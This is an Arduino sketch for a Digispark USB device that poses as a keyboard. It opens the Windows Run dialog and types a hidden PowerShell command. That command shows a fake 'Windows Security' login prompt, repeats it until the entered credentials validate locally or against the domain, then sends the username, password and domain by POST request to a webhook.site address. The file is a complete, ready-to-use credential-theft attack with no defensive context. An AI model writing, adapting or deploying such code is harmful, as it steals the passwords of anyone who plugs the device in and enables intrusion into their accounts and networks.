#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {Start-Sleep -s 60;Add-Type -assemblyname system.DirectoryServices.accountmanagement;$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);$domainDN = \"LDAP://\" + ([ADSI]"").distinguishedName;while($true){$credential = $host.ui.PromptForCredential(\"Windows Security\", \"Enter your credentials\", \"\", \"\");if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String]$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$script:pastevalue = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name;break}}};Invoke-WebRequest -Uri https://webhook.site/<YoUrSiteHooK> -Method POST -Body $pastevalue}")); //payload
  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}